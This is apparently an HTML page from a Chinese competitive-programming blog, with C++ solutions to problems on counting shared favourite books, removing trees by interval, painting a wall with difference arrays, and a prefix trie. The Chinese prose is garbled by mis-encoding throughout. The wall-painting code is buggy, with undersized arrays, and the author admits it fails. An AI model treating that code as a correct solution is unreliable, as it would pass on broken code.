å¯¹å€Ÿé˜…è®°å½•è¿›è¡Œäº†ä¸€ç•ªæ•´ç†ï¼ŒæŠŠNä¸ªè¯»è€…ä¾æ¬¡ç¼–å·ä¸º1,2,â€¦,Nï¼ŒæŠŠMæœ¬ä¹¦ä¾æ¬¡ç¼–å·ä¸º1,2,â€¦,Mã€‚åŒæ—¶ï¼ŒæŒ‰ç…§â€œè‡­å‘³ç›¸æŠ•â€çš„åŸåˆ™ï¼Œå’Œä½ å–œæ¬¢è¯»åŒä¸€æœ¬ä¹¦çš„äººï¼Œå°±æ˜¯ä½ çš„æ½œåœ¨æœ‹å‹ã€‚ä½ ç°åœ¨çš„ä»»åŠ¡æ˜¯ä»è¿™ä»½å€Ÿé˜…è®°å½•ä¸­è®¡ç®—å‡ºæ¯ä¸ªäººæœ‰å‡ ä¸ªæ½œåœ¨æœ‹å‹ã€‚</code></pre><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-22"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-22" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-24"><a href="#è¾“å…¥æè¿°-24" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¯ä¸ªæ¡ˆä¾‹ç¬¬ä¸€è¡Œä¸¤ä¸ªæ•´æ•°<span class="built_in">N</span>,Mï¼Œ<span class="number">2</span> &lt;= <span class="built_in">N</span> ï¼ŒM&lt;= <span class="number">200</span>ã€‚æ¥ä¸‹æ¥æœ‰<span class="built_in">N</span>è¡Œï¼Œç¬¬i(i = <span class="number">1</span>,<span class="number">2</span>,â€¦,<span class="built_in">N</span>)è¡Œæ¯ä¸€è¡Œæœ‰ä¸€ä¸ªæ•°ï¼Œè¡¨ç¤ºè¯»è€…i-<span class="number">1</span>æœ€å–œæ¬¢çš„å›¾ä¹¦çš„ç¼–å·P(<span class="number">1</span>&lt;=P&lt;=M)</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-24"><a href="#è¾“å‡ºæè¿°-24" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¯ä¸ªæ¡ˆä¾‹åŒ…æ‹¬Nè¡Œï¼Œæ¯è¡Œä¸€ä¸ªæ•°ï¼Œç¬¬<span class="selector-tag">i</span>è¡Œçš„æ•°è¡¨ç¤ºè¯»è€…<span class="selector-tag">i</span>æœ‰å‡ ä¸ªæ½œåœ¨æœ‹å‹ã€‚å¦‚æœ<span class="selector-tag">i</span>å’Œä»»ä½•äººéƒ½æ²¡æœ‰å…±åŒå–œæ¬¢çš„ä¹¦ï¼Œåˆ™è¾“å‡ºâ€œBeiJuâ€ï¼ˆå³æ‚²å‰§ï¼Œ^ ^ï¼‰</span><br></pre></td></tr></table></figure><p>mapmap</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line">map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; mm;</span><br><span class="line"><span class="keyword">int</span> a[n];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">mm[a[i]]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(mm[a[i]] == <span class="number">1</span>)&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;BeiJu&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> cout &lt;&lt; mm[a[i]] - <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‰©ä¸‹çš„æ ‘"><a href="#å‰©ä¸‹çš„æ ‘" class="headerlink" title="å‰©ä¸‹çš„æ ‘"></a>å‰©ä¸‹çš„æ ‘</h3><h5 id="é¢˜ç›®æè¿°-25"><a href="#é¢˜ç›®æè¿°-25" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>æœ‰ä¸€ä¸ªé•¿åº¦ä¸ºæ•´æ•°L(1&lt;=L&lt;=10000)çš„é©¬è·¯ï¼Œå¯ä»¥æƒ³è±¡æˆæ•°è½´ä¸Šé•¿åº¦ä¸ºLçš„ä¸€ä¸ªçº¿æ®µï¼Œèµ·ç‚¹æ˜¯åæ ‡åŸç‚¹ï¼Œåœ¨æ¯ä¸ªæ•´æ•°åæ ‡ç‚¹æœ‰ä¸€æ£µæ ‘ï¼Œå³åœ¨0,1,2ï¼Œâ€¦ï¼ŒLå…±L+1ä¸ªä½ç½®ä¸Šæœ‰L+1æ£µæ ‘ã€‚     ç°åœ¨è¦ç§»èµ°ä¸€äº›æ ‘ï¼Œç§»èµ°çš„æ ‘çš„åŒºé—´ç”¨ä¸€å¯¹æ•°å­—è¡¨ç¤ºï¼Œå¦‚ 100 200è¡¨ç¤ºç§»èµ°ä»100åˆ°200ä¹‹é—´ï¼ˆåŒ…æ‹¬ç«¯ç‚¹ï¼‰æ‰€æœ‰çš„æ ‘ã€‚     å¯èƒ½æœ‰M(1&lt;=M&lt;=100)ä¸ªåŒºé—´ï¼ŒåŒºé—´ä¹‹é—´å¯èƒ½æœ‰é‡å ã€‚ç°åœ¨è¦æ±‚ç§»èµ°æ‰€æœ‰åŒºé—´çš„æ ‘ä¹‹åå‰©ä¸‹çš„æ ‘çš„ä¸ªæ•°ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-23"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-23" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-25"><a href="#è¾“å…¥æè¿°-25" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä¸¤ä¸ªæ•´æ•°L<span class="comment">(1&lt;=L&lt;=10000)</span>å’ŒM<span class="comment">(1&lt;=M&lt;=100)</span>ã€‚</span><br><span class="line">    æ¥ä¸‹æ¥æœ‰Mç»„æ•´æ•°ï¼Œæ¯ç»„æœ‰ä¸€å¯¹æ•°å­—ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-25"><a href="#è¾“å‡ºæè¿°-25" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯èƒ½æœ‰å¤šç»„è¾“å…¥æ•°æ®ï¼Œå¯¹äºæ¯ç»„è¾“å…¥æ•°æ®ï¼Œè¾“å‡ºä¸€ä¸ªæ•°ï¼Œè¡¨ç¤ºç§»èµ°æ‰€æœ‰åŒºé—´çš„æ ‘ä¹‹åå‰©ä¸‹çš„æ ‘çš„ä¸ªæ•°ã€‚</span><br></pre></td></tr></table></figure><p>çº¯æš´åŠ›çš„æ–¹æ³•ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line">map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; mm;</span><br><span class="line"><span class="keyword">int</span> a[n+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line">a[i] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> cnt = <span class="number">0</span>, begin, end;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">cin &gt;&gt; begin &gt;&gt; end;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= n; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j &gt;= begin &amp;&amp; j &lt;= end &amp;&amp; a[j] == <span class="number">1</span>)&#123;</span><br><span class="line">a[j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] == <span class="number">1</span>) cnt ++;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹äº†ä¸‹åˆ«äººçš„ï¼Œæœ‰ä¸ªæ–¹æ³•å«å·®åˆ†æ•°ç»„ï¼Œå°±æ˜¯ç”¨ä¸€ä¸ªæ•°ç»„ç»´æŠ¤åŸæ•°ç»„å‰ä¸€ä¸ªå¯¹åä¸€ä¸ªçš„å·®ï¼Œå¦‚æœè¦ç»Ÿä¸€ä¿®æ”¹[a,b]ä¹‹é—´çš„å€¼åªéœ€è¦åœ¨aã€bä¸¤ç‚¹ä¿®æ”¹å·®åˆ†æ•°ç»„å°±è¡Œäº†ï¼Œå¤æ‚åº¦åªæœ‰on</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line"><span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">a</span><span class="params">(n+<span class="number">2</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">d</span><span class="params">(n+<span class="number">2</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="keyword">int</span> l, r;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">l++;</span><br><span class="line">r++;</span><br><span class="line">d[l]--;</span><br><span class="line">d[r+<span class="number">1</span>]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n+<span class="number">2</span>; i++)&#123;</span><br><span class="line">a[i] = d[i] + a[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n+<span class="number">2</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] &gt; <span class="number">0</span>)</span><br><span class="line">cnt ++;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™¤äº†è¢«æ”¹çš„åŒºåŸŸä¸€ç›´â€”å¤–ï¼Œå…¶ä»–åŒºåŸŸéƒ½æ’ä¸º1</p><h3 id="åˆ·å‡ºä¸€é“å¢™"><a href="#åˆ·å‡ºä¸€é“å¢™" class="headerlink" title="åˆ·å‡ºä¸€é“å¢™"></a>åˆ·å‡ºä¸€é“å¢™</h3><h5 id="é¢˜ç›®æè¿°-26"><a href="#é¢˜ç›®æè¿°-26" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p> åœ¨ä¸€é¢å¾ˆé•¿çš„å¢™å£ä¸Šï¼Œå·¥äººä»¬ç”¨ä¸åŒçš„æ²¹æ¼†å»åˆ·å¢™ï¼Œç„¶è€Œå¯èƒ½æœ‰äº›åœ°æ–¹åˆ·è¿‡ä»¥åè§‰å¾—ä¸å¥½çœ‹ï¼Œä»–ä»¬ä¼šé‡æ–°åˆ·ä¸€ä¸‹ã€‚æœ‰äº›éƒ¨åˆ†å› ä¸ºé‡å¤åˆ·äº†å¾ˆå¤šæ¬¡è¦†ç›–äº†å¾ˆå¤šå±‚æ²¹æ¼†ï¼Œå°è¯ºå¾ˆå¥½å¥‡é‚£äº›åœ°æ–¹è¢«åˆ·è¿‡å¤šå°‘ç§é¢œè‰²çš„æ²¹æ¼†ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-24"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-24" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-26"><a href="#è¾“å…¥æè¿°-26" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è‹¥å¹²è¡Œè¾“å…¥ï¼Œæ¯è¡Œä¸¤ä¸ªæ•°å­—B<span class="comment">[i]</span>,E<span class="comment">[i]</span>(0&lt;=B<span class="comment">[i]</span>&lt;=E<span class="comment">[i]</span>&lt;=200000)è¡¨ç¤ºè¿™æ¬¡åˆ·çš„å¢™å£æ˜¯å“ªä¸€æ®µ</span><br><span class="line">ï¼ˆå‡è®¾æ¯æ¬¡åˆ·çš„æ—¶å€™æ²¹æ¼†é¢œè‰²éƒ½å’Œä¹‹å‰çš„ä¸åŒï¼‰ï¼Œä»¥0 0ç»“æŸ</span><br><span class="line">åˆè‹¥å¹²è¡Œè¾“å…¥ï¼Œæ¯è¡Œä¸¤ä¸ªæ•°å­—begin<span class="comment">[i]</span>,end<span class="comment">[i]</span>ï¼ˆ0&lt;=begin<span class="comment">[i]</span>&lt;=end<span class="comment">[i]</span>&lt;=200000ï¼‰è¡¨ç¤ºå°è¯ºè¯¢é—®çš„æ®µï¼Œ</span><br><span class="line">ä»¥0 0ç»“æŸ</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-26"><a href="#è¾“å‡ºæè¿°-26" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹äºæ¯ä¸ªå°è¯ºçš„è¯¢é—®è¾“å‡º(<span class="keyword">end</span>[i]-<span class="keyword">begin</span>[i]+<span class="number">1</span>)è¡Œ,è¡¨ç¤ºå¯¹åº”è¯¢é—®æ®µçš„æ¯ä¸ªç‚¹è¢«å¤šå°‘ç§é¢œè‰²çš„æ²¹æ¼†è¦†ç›–è¿‡ã€‚</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å·®åˆ†æ•°ç»„ï¼Œä¸çŸ¥é“ä¸ºå•¥æˆ‘çš„ä¸€ç›´è¿‡ä¸äº†~è¯•äº†æ”¹scanfå’Œå»æ‰coutçš„ç¼“å†²åŒºéƒ½ä¸è¡Œ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> l, r, m = <span class="number">0</span>;</span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">a</span><span class="params">(<span class="number">20005</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">d</span><span class="params">(<span class="number">20005</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;l, &amp;r) != EOF)&#123;</span><br><span class="line"><span class="keyword">if</span>(l == <span class="number">0</span> &amp;&amp; r == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">l++;</span><br><span class="line">r++;</span><br><span class="line">d[l]++;</span><br><span class="line">d[r+<span class="number">1</span>]--;</span><br><span class="line">m = <span class="built_in">max</span>(r, m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++)&#123;</span><br><span class="line">a[i] = d[i] + a[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;l, &amp;r) != EOF)&#123;</span><br><span class="line"><span class="keyword">if</span>(l == <span class="number">0</span> &amp;&amp; r == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">l++;</span><br><span class="line">r++;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = l; i &lt;= r; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å‰ç¼€æ ‘"><a href="#å‰ç¼€æ ‘" class="headerlink" title="å‰ç¼€æ ‘"></a>å‰ç¼€æ ‘</h2><h3 id="å‰ç¼€å­—ç¬¦ä¸²"><a href="#å‰ç¼€å­—ç¬¦ä¸²" class="headerlink" title="å‰ç¼€å­—ç¬¦ä¸²"></a>å‰ç¼€å­—ç¬¦ä¸²</h3><h5 id="é¢˜ç›®æè¿°-27"><a href="#é¢˜ç›®æè¿°-27" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>å¦‚æœä¸€ä¸ªå­—ç¬¦ä¸²s1æ˜¯ç”±å¦ä¸€ä¸ªå­—ç¬¦ä¸²s2çš„å‰é¢éƒ¨åˆ†è¿ç»­å­—ç¬¦ç»„æˆçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¯´s1å°±æ˜¯s2çš„å‰ç¼€ã€‚æ¯”å¦‚â€œacâ€æ˜¯â€œacmâ€çš„å‰ç¼€ï¼Œâ€œabcdâ€æ˜¯â€œabcddfasfâ€çš„å‰ç¼€ï¼Œç‰¹åˆ«çš„â€œkdfaâ€æ˜¯â€œkdfaâ€çš„å‰ç¼€ã€‚ ç°åœ¨ç»™ä½ ä¸€äº›å­—ç¬¦ä¸²ï¼Œä½ çš„ä»»åŠ¡å°±æ˜¯ä»è¿™äº›å­—ç¬¦ä¸²ä¸­æ‰¾å‡ºä¸€äº›å­—ç¬¦ä¸²æ”¾åˆ°ä¸€ä¸ªé›†åˆä¸­ï¼Œä½¿å¾—è¿™ä¸ªé›†åˆä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦ä¸²ä¸æ˜¯å…¶ä»–å­—ç¬¦ä¸²çš„å‰ç¼€ï¼Œå¹¶ä¸”è¦ä½¿é›†åˆé‡Œçš„å­—ç¬¦ä¸²å°½å¯èƒ½çš„å¤šã€‚è¾“å‡ºè¿™ä¸ªé›†åˆä¸­å­—ç¬¦ä¸²çš„ä¸ªæ•°ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-25"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-25" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-27"><a href="#è¾“å…¥æè¿°-27" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æœ‰å¤šç»„æµ‹è¯•æ•°æ®ã€‚æ¯ç»„æµ‹è¯•æ•°æ®ä»¥ä¸€ä¸ªæ•´æ•°<span class="built_in">n</span>å¼€å¤´ï¼Œéšåæœ‰<span class="built_in">n</span>ä¸ªå­—ç¬¦ä¸²ã€‚ å½“<span class="built_in">n</span>=<span class="number">0</span>æ—¶è¡¨ç¤ºè¾“å…¥ç»“æŸã€‚</span><br><span class="line"><span class="number">0</span>&lt;<span class="built_in">n</span>&lt;<span class="number">100</span>ï¼Œå­—ç¬¦ä¸²é•¿åº¦ä¸å¤§äº<span class="number">20</span>ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-27"><a href="#è¾“å‡ºæè¿°-27" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¯ç»„æµ‹è¯•æ•°æ®è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œå³æ‰€æ±‚çš„æœ€å¤§å€¼ã€‚æ¯ç»„æ•°æ®å ä¸€è¡Œã€‚</span><br></pre></td></tr></table></figure><p>æ„å»ºä¸€é¢—å‰ç¼€æ ‘ï¼Œæ±‚å®ƒçš„å¶å­èŠ‚ç‚¹ä¸ªæ•°å³å¯ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">26</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> ct;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>[<span class="title">maxn</span>];</span></span><br><span class="line">&#125; *Tree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initTree</span><span class="params">(Tree &amp;r)</span></span>&#123;</span><br><span class="line">r-&gt;ct = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; maxn; i++)&#123;</span><br><span class="line">r-&gt;next[i] = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildTree</span><span class="params">(Tree &amp;r, string s)</span></span>&#123;</span><br><span class="line">Tree p = r, q;</span><br><span class="line"><span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> k = s[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;next[k] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">q = <span class="keyword">new</span> node;</span><br><span class="line">q-&gt;ct = <span class="number">1</span>;</span><br><span class="line"><span 